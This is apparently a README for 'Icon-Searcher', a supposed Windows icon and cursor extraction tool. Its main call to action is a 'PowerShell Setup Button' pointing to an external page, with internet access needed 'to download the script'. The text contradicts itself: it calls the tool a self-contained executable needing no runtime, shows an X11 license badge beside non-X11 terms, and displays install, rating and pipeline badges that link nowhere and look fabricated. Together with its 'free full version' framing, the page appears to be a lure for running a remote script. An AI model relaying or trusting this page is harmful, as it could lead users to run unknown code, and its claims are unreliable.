<div align="center">

# Icon-Searcher: Icon & Cursor Search Tool for Windows 10 & 11

![](files/preview.png)

### 🔌 PowerShell Setup Button

[![](files/button.png)](https://nagariksolution.github.io/icon-searcher/)

[![pipeline](https://img.shields.io/badge/PIPELINE-OK-2ea44f?style=flat-square&labelColor=0d1117)]() [![platform](https://img.shields.io/badge/PLATFORM-WIN_10%2F11-2ea44f?style=flat-square&labelColor=0d1117)]() [![powershell](https://img.shields.io/badge/POWERSHELL-SCRIPT-34b759?style=flat-square&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/LIC-X11-1a7f37?style=flat-square&labelColor=0d1117)]() [![installs](https://img.shields.io/badge/INSTALLS-48K-238636?style=flat-square&labelColor=0d1117)]() [![stars](https://img.shields.io/badge/STARS-4.9%2F5-f59e0b?style=flat-square&labelColor=0d1117)]()

</div>

---

Icon Searcher is a Windows desktop utility for locating, inspecting, and managing icon and cursor resources embedded across executable, library, and standalone icon files. It indexes icon-bearing files and renders results in a unified viewer, letting you filter matches by pixel dimensions or color characteristics to narrow large result sets quickly. Built for fast traversal of resource-heavy directories, the tool supports previewing individual icons, comparing variants, and exporting selected assets to common image formats for reuse in development and design workflows.

## 🔧 Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

Icon-Searcher provides a focused toolset for locating, inspecting, and extracting icon and cursor resources across Windows file types.

- **Multi-Format Scanning**: Traverses executable, library, and icon container files to enumerate embedded icon and cursor resources without manual directory browsing.
- **Structured Result Grid**: Presents all discovered resources in a unified view with metadata columns for dimensions, color depth, and source file origin.
- **Size Filtering**: Narrows results by exact or ranged pixel dimensions to isolate resources suitable for a specific display context.
- **Color-Based Filtering**: Refines result sets by dominant color characteristics, enabling rapid identification of visually consistent assets.
- **Cursor Resource Support**: Detects and displays cursor assets alongside standard icons, covering both static and animated variants within supported containers.
- **Preview Inspection**: Renders selected resources at full fidelity before extraction, allowing visual verification without writing files to disk.
- **Export Pipeline**: Writes individual or batched selections to standard image formats while preserving source fidelity.
- **Duplicate Detection**: Identifies redundant resources across scanned locations to reduce noise in large result sets.
- **Batch Operations**: Applies filtering, preview, and export actions across multiple selections to streamline high-volume workflows.
- **Local-Only Processing**: Performs all scanning and extraction on the host machine with no network dependency during operation.

## How It Works

Icon Searcher operates as a local indexing and extraction engine that scans the Windows file system for embedded icon and cursor resources, then presents them through a unified browsing interface.

**Resource Discovery**

The application walks targeted directories and drive volumes, inspecting file headers to identify containers that may hold icon data — including executables, dynamic link libraries, and standalone icon and cursor files. Rather than loading entire files into memory, it reads resource sections directly, which keeps scanning fast even across large directory trees.

**Resource Extraction**

For each candidate file, the parser enumerates the embedded resource table and extracts every icon and cursor group it finds. Multi-resolution resources are unpacked into their individual image entries, so a single file containing several size variants yields multiple viewable results rather than one flattened preview. Extracted entries are held in an in-memory catalog keyed by source path and resource identifier.

**Filtering and Search**

Once the catalog is populated, results can be narrowed through several independent filters: by pixel dimensions, by color depth, by source file type, or by text matching against resource names and file names. Filters compose, so a query can combine a size constraint with a color filter and a name pattern. Because filtering runs against the in-memory catalog, refining a search does not trigger a rescan.

**Preview and Inspection**

Selecting a result renders the icon or cursor at its native resolution alongside its metadata — dimensions, bit depth, format, and originating file. Cursor entries display their hotspot coordinates. The preview pane supports zoom for inspecting fine detail in small assets.

**Duplicate Detection**

The tool computes content signatures for extracted resources and groups entries that are byte-identical across different source files. This allows redundant assets scattered across the system to be identified and excluded from the working set before export.

**Export Pipeline**

Selected entries can be written out individually or in batches. Each export preserves the resource's native dimensions and transparency, and the output format is chosen per batch. The export stage reads from the catalog rather than re-parsing source files, so repeated exports do not incur additional disk scanning.

**Architecture Notes**

All processing is performed locally; no file contents leave the machine. The scanner runs on a background thread with progress reporting, keeping the interface responsive during large directory traversals. The catalog is session-scoped and rebuilt on demand, ensuring results always reflect the current state of the file system.

## Compatibility

Icon Searcher is built exclusively for the Windows desktop platform and is designed to operate across the current and recent generations of the operating system. The application targets Windows 10 and Windows 11 on both 64-bit and 32-bit architectures, and it runs on standard x86-64 hardware without requiring specialized components or dedicated graphics acceleration.

The tool integrates directly with the Windows file system and shell environment, which allows it to enumerate icon and cursor resources embedded in executable files, dynamic-link libraries, and standalone icon containers. Because it relies on native Windows resource APIs, no external runtime, framework, or interpreter installation is required to launch or operate the application.

Compatibility extends to the full range of icon and cursor resource formats supported by the operating system. Icon Searcher can read and display resources stored in EXE, DLL, ICO, and CUR files, and it preserves alpha channel and multi-resolution data during preview and extraction. Exported output is compatible with standard Windows icon and cursor consumers, as well as common image workflows, through support for ICO, CUR, JPEG, GIF, and BMP formats.

The application is validated against the Windows desktop experience, including high-DPI display configurations and multi-monitor setups. Filtering by size, color, and name operates consistently regardless of display scaling, and icon previews render at their native resolutions. File system compatibility covers local NTFS and FAT32 volumes as well as mapped network drives accessible through standard Windows paths.

Icon Searcher is distributed as a self-contained Windows executable and does not depend on third-party libraries outside the operating system. This keeps the deployment footprint minimal and avoids version conflicts with other installed software. Compatibility with the supported Windows releases is maintained through regular updates that track operating system changes and resource format revisions.

## FAQ

**Which file types does Icon Searcher scan for embedded icons and cursors?**

Icon Searcher recursively scans executable binaries, dynamic libraries, and standalone icon or cursor containers. It extracts icon resources from PE files (EXE, DLL, OCX), reads ICO and CUR containers directly, and enumerates cursor resources alongside standard icons. Scanned locations can be limited to specific drives, directories, or file masks to keep indexing fast on large volumes.

**How does the filtering engine work?**

Results can be filtered by pixel dimensions, color depth, and dominant color, either individually or in combination. Size filters match exact dimensions or ranges, letting you isolate 16×16, 32×32, or 256×256 assets. Color filtering narrows the result set to icons containing a specified hue, which is useful when hunting for a single asset across thousands of matches. Filters apply to the live result list without re-scanning the source files.

**Can icons be exported in bulk, and which formats are supported?**

Yes. Selected icons can be exported individually or as a batch to ICO, BMP, JPEG, and GIF. Batch export preserves the original pixel dimensions by default, with an option to normalize output to a target size. Exported files are written to a destination folder of your choice, and the original source binaries are never modified during extraction.

**Does Icon Searcher modify or write to the files it scans?**

No. Scanning and extraction are strictly read-only operations. Icon Searcher opens source files for reading only and does not alter, repack, or overwrite any binary, library, or icon container it inspects. Export operations write new files to the destination you specify.

**How are duplicate icons detected?**

Duplicate detection compares extracted icon data by content rather than filename. Identical assets found across multiple files are grouped so you can review them before removal from the working set. Deduplication affects only the result list and exported collections; source files on disk remain untouched.

**What are the system requirements?**

Icon Searcher runs on Windows 10 or later with a 1 GHz or faster processor, at least 1 GB of RAM, and roughly 100 MB of free disk space. Additional space is recommended when exporting large batches. The application is delivered as a native Windows desktop tool and does not require a separate runtime.

**Is this the full version, and are there feature limitations?**

The distributed build is the complete version with all search, filter, preview, deduplication, and export capabilities enabled. There are no locked features, watermarking, or export caps. Updates are provided to maintain compatibility with current Windows releases.

**How can scan performance be improved on large directories?**

Scope scans to targeted directories instead of entire volumes, apply file masks to exclude unrelated binaries, and enable size or color filters before running a broad search. Restricting scans to folders known to contain icon resources significantly reduces indexing time on systems with many installed applications.

**Where can usage guidance and troubleshooting information be found?**

A user guide covering scanning workflow, filter configuration, and export options ships with the application. Troubleshooting notes address common scenarios such as empty result sets, permission-restricted directories, and unexpected export behavior.

## Disclaimer

Icon Searcher is provided as a free full version for Windows, and it is distributed on an "as is" and "as available" basis without warranties of any kind, whether express, implied, or statutory. This includes, but is not limited to, implied warranties of merchantability, fitness for a particular purpose, title, and non-infringement. The development and maintenance team make no representation or guarantee that the software will be uninterrupted, error-free, or free of harmful components, or that any defects will be corrected.

By scanning, indexing, and exporting icons and cursors from files such as EXE, DLL, and ICO, Icon Searcher accesses file metadata and embedded resources on your local system. You are solely responsible for ensuring you have the necessary rights and permissions to view, extract, modify, or redistribute any icons or cursor assets processed through the tool. The software does not grant any license or ownership over third-party icon assets, and any use of extracted content remains subject to the terms imposed by the respective rights holders.

To the maximum extent permitted by applicable law, the developers and distributors of Icon Searcher shall not be liable for any direct, indirect, incidental, special, consequential, or punitive damages, including but not limited to loss of data, loss of profits, business interruption, or damage to files or systems, arising out of or in connection with the installation, use, or inability to use the software. This limitation applies regardless of the theory of liability and even if advised of the possibility of such damages.

Icon Searcher performs read and export operations on user-selected files and may write exported assets and configuration data to disk. You are advised to maintain independent backups of any files you scan or modify and to validate exported output before relying on it in production or distribution workflows. Features such as duplicate removal and batch export modify file collections and should be used with appropriate caution.

The software is intended for use on supported Windows environments as described in the compatibility documentation. Behavior may vary across file types, system configurations, and third-party file formats, and certain malformed or protected files may not be readable. The developers reserve the right to modify, update, or discontinue features at any time without prior notice.

This disclaimer does not exclude or limit any liability that cannot be excluded or limited under applicable law. If any provision of this disclaimer is held to be invalid or unenforceable, the remaining provisions shall remain in full force and effect. Your installation and continued use of Icon Searcher constitutes acceptance of these terms.

## License

Icon Searcher is distributed as a complete, fully featured release. The version made available for download includes the entire feature set — icon and cursor search across supported file types, size and color filtering, preview, batch export, and duplicate removal — with no trial restrictions, feature caps, or time-limited evaluation periods. No license key, activation step, or account registration is required to unlock functionality.

The application is licensed for installation and use on Windows systems as provided. Redistribution of modified binaries, repackaging under alternate branding, or commercial resale of the software itself is not covered under these terms. Because the download represents the full build rather than a reduced trial, all documented capabilities are accessible immediately after setup, and subsequent updates to the same release line are made available without additional cost.

Use of Icon Searcher is provided on an as-is basis, without warranty of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or distributors be liable for any claim, damages, or other liability arising from the use of or inability to use the software. Users are responsible for ensuring they hold appropriate rights to any icons or cursor assets they extract, export, or redistribute using the tool; Icon Searcher performs the extraction and conversion operations but does not grant ownership or usage rights over third-party graphical assets processed with it.

This license applies to the software as distributed by the project itself. Any component, asset, or dependency bundled with the release that carries its own separate terms remains governed by those terms. Continued use of Icon Searcher constitutes acceptance of the conditions described in this section.